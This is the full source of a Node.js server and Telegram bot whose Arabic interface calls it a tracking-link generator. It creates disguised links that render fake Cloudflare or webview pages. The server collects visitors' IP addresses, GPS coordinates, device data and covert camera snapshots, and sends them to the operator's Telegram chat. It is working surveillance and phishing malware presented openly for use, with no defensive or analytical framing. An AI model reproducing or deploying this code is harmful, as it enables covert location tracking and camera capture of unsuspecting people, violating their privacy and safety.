const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], { polling: true });
var jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
var urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");
var hostURL = process.env["HOST_URL"] || "";
var use1pt = false;
app.get("/w/:path/:uri", (req, res) => {
  var ip; var d = new Date(); d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }
  if (req.params.path != null) { res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt }); } else { res.redirect("https://t.me/th30neand0nly0ne"); }
});
app.get("/c/:path/:uri", (req, res) => {
  var ip; var d = new Date(); d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }
  if (req.params.path != null) { res.render("cloudflare", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt }); } else { res.redirect("https://t.me/th30neand0nly0ne"); }
});
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  if (msg?.reply_to_message?.text == "🌐 Enter Your URL") { createLink(chatId, msg.text); }
  if (msg.text == "/start") {
    var m = { reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "إنشاء رابط", callback_data: "crenew" }]] }) };
    bot.sendMessage(chatId, `مرحباً بك ${msg.chat.first_name}!\nاستخدم هذا البوت لإنشاء روابط تتبع.\nاضغط /help للمزيد.`, m);
  } else if (msg.text == "/create") { createNew(chatId); }
});
bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data == "crenew") { createNew(callbackQuery.message.chat.id); }
});
bot.on('polling_error', (error) => {});
async function createLink(cid, msg) {
  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
  if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
    var url = cid.toString(36) + '/' + btoa(msg);
    var m = { reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "إنشاء ربط جديد", callback_data: "crenew" }]] }) };
    var cUrl = `${hostURL}/c/${url}`; var wUrl = `${hostURL}/w/${url}`;
    bot.sendChatAction(cid, "typing");
    bot.sendMessage(cid, `تم إنشاء الروابط بنجاح.\nURL: ${msg}\n\n🌐 الرابط الأول:\n${cUrl}\n\n🌐 الرابط الثاني:\n${wUrl}`, m);
  } else { bot.sendMessage(cid, `⚠️ أدخل رابطاً صحيحاً يحتوي على http أو https`); createNew(cid); }
}
function createNew(cid) { bot.sendMessage(cid, `🌐 Enter Your URL`, { reply_markup: JSON.stringify({ "force_reply": true }) }); }
app.get("/", (req, res) => {
  var ip; if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }
  res.json({ "ip": ip });
});
app.post("/location", (req, res) => {
  var lat = parseFloat(decodeURIComponent(req.body.lat)) || null; var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  var uid = decodeURIComponent(req.body.uid) || null; var acc = decodeURIComponent(req.body.acc) || null;
  if (lon != null && lat != null && uid != null && acc != null) { bot.sendLocation(parseInt(uid, 36), lat, lon); bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`); res.send("Done"); }
});
app.post("/", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null; var data = decodeURIComponent(req.body.data) || null;
  if (uid != null && data != null) { data = data.replaceAll("<br>", "\n"); bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" }); res.send("Done"); }
});
app.post("/camsnap", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null; var img = decodeURIComponent(req.body.img) || null;
  if (uid != null && img != null) { var buffer = Buffer.from(img, 'base64'); try { bot.sendPhoto(parseInt(uid, 36), buffer, {}, { filename: "camsnap.png", contentType: 'image/png' }); } catch (e) { console.log(e); } res.send("Done"); }
});
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => { console.log(`App Running on Port ${PORT}!`); });
